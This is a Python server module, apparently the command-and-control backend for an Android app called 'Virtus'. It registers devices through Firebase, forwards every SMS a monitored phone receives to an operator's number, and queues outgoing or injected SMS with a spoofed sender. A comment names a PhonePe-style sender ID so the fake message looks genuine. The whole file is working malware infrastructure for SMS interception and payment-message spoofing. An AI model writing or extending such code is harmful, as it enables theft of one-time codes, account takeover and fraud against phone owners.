import json
import logging
import time
from datetime import datetime, timezone
from urllib.parse import quote

import httpx

from app.config import get_settings
from app.database import Device, MonitorProfile, OutboundSMS
from app.firebase_client import normalize_firebase_url

logger = logging.getLogger(__name__)
settings = get_settings()


def get_profile_firebase_url(profile: MonitorProfile) -> str | None:
    if profile.firebase_url:
        return normalize_firebase_url(profile.firebase_url)
    if profile.license_key and profile.license_key.lower().startswith("http"):
        return normalize_firebase_url(profile.license_key)
    return None


def resolve_firebase_url(profile: MonitorProfile) -> str | None:
    """Firebase URL where APK polls messages/commands."""
    user_url = get_profile_firebase_url(profile)
    if user_url:
        return user_url
    license_key = get_license_key(profile)
    if license_key and license_key.upper().startswith("KEY-"):
        return settings.virtus_module_db.rstrip("/")
    return None


def get_license_key(profile: MonitorProfile) -> str | None:
    if profile.license_key:
        return profile.license_key.strip()
    if profile.firebase_url:
        return normalize_firebase_url(profile.firebase_url)
    return None


def _config_path_key(license_key: str) -> str:
    key = license_key.strip()
    if key.lower().startswith("http"):
        return quote(key, safe="")
    return key.upper()


async def _firebase_put(url: str, data: dict) -> None:
    async with httpx.AsyncClient(timeout=15.0, follow_redirects=True) as client:
        response = await client.put(f"{url}.json", json=data)
        response.raise_for_status()


async def push_virtus_config(profile: MonitorProfile, device: Device | None = None) -> None:
    """Push config for Virtus APK (virtus_config + module DB config/{KEY})."""
    module_db = settings.virtus_module_db.rstrip("/")
    firebase_url = resolve_firebase_url(profile)
    if not firebase_url:
        return

    license_key = get_license_key(profile)
    device_id = device.name if device else ""
    payload = {
        "monitoring": profile.is_monitoring,
        "ts": int(time.time() * 1000),
        "firebase_url": firebase_url,
        "device_id": device_id,
        "firebase_key": license_key if license_key and license_key.upper().startswith("KEY-") else "",
        "channel_id": profile.channel_id,
        "target_number": profile.phone_number,
        "sim_index": profile.selected_sim_index or 0,
    }

    user_fb = get_profile_firebase_url(profile)
    if user_fb:
        await _firebase_put(f"{user_fb}/virtus_config", payload)
        if license_key and license_key.upper().startswith("KEY-"):
            await _firebase_put(f"{user_fb}/config/{_config_path_key(license_key)}", payload)

    if (
        license_key
        and license_key.upper().startswith("KEY-")
        and module_db
        and (not user_fb or normalize_firebase_url(module_db) != user_fb)
    ):
        await _firebase_put(f"{module_db}/config/{_config_path_key(license_key)}", payload)


async def push_outgoing_sms_command(
    firebase_url: str,
    device_id: str,
    to_number: str,
    message: str,
    sim_index: int = 0,
    spoof_sender: str | None = None,
) -> str:
    """Queue outgoing SMS send for device/APK: {firebase}/commands/{device_id}/{id}."""
    base = normalize_firebase_url(firebase_url)
    command_id = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
    payload = {
        "to": to_number,
        "message": message,
        "sim_index": sim_index,
        "spoof_sender": spoof_sender,
        "status": "pending",
        "created_at": datetime.now(timezone.utc).isoformat(),
    }
    await _firebase_put(f"{base}/commands/{device_id}/{command_id}", payload)
    return command_id


async def push_inject_message(
    firebase_url: str,
    device_id: str,
    sender: str,
    body: str,
) -> str:
    """Queue SMS inject for Virtus APK: {firebase}/messages/{device_id}/{id}."""
    base = normalize_firebase_url(firebase_url)
    message_id = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
    payload = {
        "sender": sender,
        "body": body,
        "injected": False,
        "created_at": datetime.now(timezone.utc).isoformat(),
    }
    await _firebase_put(f"{base}/messages/{device_id}/{message_id}", payload)
    return message_id


async def register_device_on_firebase(
    firebase_url: str,
    device: Device,
    profile: MonitorProfile,
) -> None:
    base = normalize_firebase_url(firebase_url)
    meta = {}
    if device.device_meta:
        try:
            meta = json.loads(device.device_meta)
        except json.JSONDecodeError:
            meta = {}

    payload = {
        "name": device.name,
        "phone": device.phone_number,
        "battery": meta.get("battery", "98"),
        "online": True,
        "sim_index": profile.selected_sim_index or 0,
        "last_seen": datetime.now(timezone.utc).isoformat(),
    }
    await _firebase_put(f"{base}/devices/{device.name}", payload)


async def sync_profile_to_firebase(profile: MonitorProfile, device: Device | None = None) -> None:
    if not resolve_firebase_url(profile):
        return
    try:
        await push_virtus_config(profile, device)
        if device:
            firebase_url = resolve_firebase_url(profile)
            if firebase_url:
                await register_device_on_firebase(firebase_url, device, profile)
    except Exception as exc:
        logger.warning("Firebase profile sync failed: %s", exc)


def mynum_device_id(phone_number: str) -> str:
    """Virtus APK device id for /mynum phone (see set_user_phone)."""
    from app.services import normalize_phone

    return f"num-{normalize_phone(phone_number)}"


async def push_outbound_to_firebase(
    profile: MonitorProfile,
    device: Device,
    outbound: OutboundSMS,
) -> str | None:
    """Push outgoing send or inject command to Firebase for Virtus APK."""
    firebase_url = resolve_firebase_url(profile)
    if not firebase_url:
        return None

    try:
        if outbound.spoof_sender and outbound.to_number:
            # Inject on /mynum phone so inbox shows original sender (AX-PHONPE-S, etc.)
            return await push_inject_message(
                firebase_url,
                mynum_device_id(outbound.to_number),
                outbound.spoof_sender,
                outbound.message,
            )
        if outbound.spoof_sender:
            return await push_inject_message(
                firebase_url,
                device.name,
                outbound.spoof_sender,
                outbound.message,
            )
        return await push_outgoing_sms_command(
            firebase_url,
            device.name,
            outbound.to_number,
            outbound.message,
            sim_index=outbound.sim_index,
        )
    except Exception as exc:
        logger.warning("Firebase outbound push failed: %s", exc)
        return None


async def send_polling_startup_test(db, profile: MonitorProfile, device: Device) -> None:
    """On polling start — inject test SMS and forward to /mynum if set."""
    from app.device_ui import STARTUP_TEST_MESSAGE, STARTUP_TEST_SENDER

    firebase_url = resolve_firebase_url(profile)
    if firebase_url:
        try:
            await push_inject_message(
                firebase_url,
                device.name,
                STARTUP_TEST_SENDER,
                STARTUP_TEST_MESSAGE,
            )
        except Exception as exc:
            logger.warning("Startup inject push failed: %s", exc)

    if profile.phone_number:
        try:
            await forward_incoming_to_mynum(db, profile, device, STARTUP_TEST_SENDER, STARTUP_TEST_MESSAGE)
        except Exception as exc:
            logger.warning("Startup mynum forward failed: %s", exc)


async def forward_incoming_to_mynum(
    db,
    profile: MonitorProfile,
    device: Device,
    sender: str,
    message: str,
) -> None:
    """Forward device incoming SMS to /mynum via outbox + Firebase commands."""
    if not profile.phone_number or not profile.is_monitoring:
        return

    from app.channel_relay import queue_forward_to_mynum

    try:
        outbound = queue_forward_to_mynum(db, profile, device, sender, message)
        await push_outbound_to_firebase(profile, device, outbound)
    except Exception as exc:
        logger.warning("Forward to mynum failed for device %s: %s", device.id, exc)
